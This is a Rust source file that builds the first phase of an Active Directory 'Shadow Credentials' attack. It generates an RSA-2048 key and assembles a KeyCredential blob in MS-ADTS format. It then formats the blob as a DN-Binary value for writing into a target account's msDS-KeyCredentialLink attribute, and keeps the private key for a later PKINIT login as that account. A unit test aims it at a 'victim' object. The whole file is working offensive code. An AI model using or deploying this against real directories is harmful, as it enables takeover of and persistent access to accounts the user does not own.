//! Shadow Credentials (MS-ADTS msDS-KeyCredentialLink) — Phase 1: build a KeyCredential
//! from a fresh RSA key and format it as the DN-Binary value to write to a target we can
//! write. Phase 2 (PKINIT auth with the key) is separate. AD validates the blob structure
//! on write, so a successful write confirms the structure is correct.

use rand::RngCore;
use rsa::pkcs8::EncodePrivateKey;
use rsa::traits::PublicKeyParts;
use rsa::RsaPrivateKey;
use sha2::{Digest, Sha256};

fn sha256(data: &[u8]) -> [u8; 32] {
    let mut h = Sha256::new();
    h.update(data);
    h.finalize().into()
}

/// KEYCREDENTIALLINK entry: Length(u16 LE) + Identifier(1) + Value.
fn entry(id: u8, value: &[u8]) -> Vec<u8> {
    let mut e = (value.len() as u16).to_le_bytes().to_vec();
    e.push(id);
    e.extend_from_slice(value);
    e
}

fn now_filetime_le() -> [u8; 8] {
    use std::time::{SystemTime, UNIX_EPOCH};
    let secs = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs();
    ((secs + 11_644_473_600) * 10_000_000).to_le_bytes()
}

/// A generated Shadow Credential: the DN-Binary value for msDS-KeyCredentialLink and the
/// PKCS#8 PEM private key (kept for the later PKINIT step).
pub struct KeyCredential {
    pub dn_binary: String,
    pub private_key_pem: String,
}

/// Generate an RSA-2048 KeyCredential for `target_dn`.
pub fn build_key_credential(target_dn: &str) -> anyhow::Result<KeyCredential> {
    let mut rng = rand::thread_rng();
    let priv_key = RsaPrivateKey::new(&mut rng, 2048)?;
    let pub_key = priv_key.to_public_key();
    let n = pub_key.n().to_bytes_be();
    let e = pub_key.e().to_bytes_be();

    // BCRYPT_RSAPUBLIC_BLOB: "RSA1" | BitLength | cbPubExp | cbModulus | cbPrime1 | cbPrime2 | exp | mod
    let mut km = b"RSA1".to_vec();
    km.extend_from_slice(&2048u32.to_le_bytes());
    km.extend_from_slice(&(e.len() as u32).to_le_bytes());
    km.extend_from_slice(&(n.len() as u32).to_le_bytes());
    km.extend_from_slice(&0u32.to_le_bytes()); // cbPrime1
    km.extend_from_slice(&0u32.to_le_bytes()); // cbPrime2
    km.extend_from_slice(&e);
    km.extend_from_slice(&n);

    let mut device_id = [0u8; 16];
    rng.fill_bytes(&mut device_id);
    let ft = now_filetime_le();

    // Entries after KeyHash (0x03..0x09), in identifier order — KeyHash covers exactly these.
    let mut tail = Vec::new();
    tail.extend(entry(0x03, &km)); // KeyMaterial
    tail.extend(entry(0x04, &[0x01])); // KeyUsage = NGC
    tail.extend(entry(0x05, &[0x00])); // KeySource = AD
    tail.extend(entry(0x06, &device_id)); // DeviceId
    tail.extend(entry(0x07, &[0x01, 0x00])); // CustomKeyInfo: version 1, flags 0
    tail.extend(entry(0x08, &ft)); // LastLogonTime
    tail.extend(entry(0x09, &ft)); // CreationTime

    let key_id = sha256(&km);
    let key_hash = sha256(&tail);

    let mut blob = 0x0000_0200u32.to_le_bytes().to_vec(); // Version 0x200
    blob.extend(entry(0x01, &key_id)); // KeyID
    blob.extend(entry(0x02, &key_hash)); // KeyHash
    blob.extend(&tail);

    // DN-Binary syntax: B:<hex-char-count>:<hex>:<DN>
    let hex = hex::encode(&blob);
    let dn_binary = format!("B:{}:{}:{}", hex.len(), hex, target_dn);

    let pem = priv_key.to_pkcs8_pem(rsa::pkcs8::LineEnding::LF)?.to_string();
    Ok(KeyCredential { dn_binary, private_key_pem: pem })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn key_credential_blob_shape() {
        let kc = build_key_credential("CN=victim,DC=corp,DC=local").unwrap();
        assert!(kc.dn_binary.starts_with("B:"));
        assert!(kc.dn_binary.ends_with(":CN=victim,DC=corp,DC=local"));
        assert!(kc.private_key_pem.contains("PRIVATE KEY"));
        // version 0x200 at the front of the blob (hex "00020000")
        let hex = kc.dn_binary.split(':').nth(2).unwrap();
        assert!(hex.starts_with("00020000"));
    }
}
